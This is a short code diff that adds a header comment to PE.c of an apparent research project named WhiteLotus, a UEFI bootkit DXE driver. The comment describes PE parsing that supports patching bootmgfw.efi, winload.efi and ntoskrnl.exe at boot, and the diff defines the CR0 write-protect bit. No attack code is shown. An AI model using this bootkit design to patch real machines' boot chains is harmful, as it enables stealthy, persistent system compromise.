@@ -1,3 +1,30 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : PE.c
+ * ============================================================
+ *
+ *  Description:
+ *    Full-featured PE parsing utility library for the UEFI
+ *    environment. Provides NT header validation with five-
+ *    level paging and canonical-address detection, export
+ *    directory and IAT traversal, resource directory search,
+ *    PE version info extraction, function-start backtracking
+ *    via the exception directory, and RVA-to-raw-offset
+ *    translation.
+ *
+ *  Purpose:
+ *    - Support the entire boot-time patch chain with reliable
+ *      PE parsing on bootmgfw.efi, winload.efi, and
+ *      ntoskrnl.exe images loaded by the UEFI firmware.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "WhiteLotus.h"
 
 #define CR0_WP			((UINTN)0x00010000) // CR0.WP
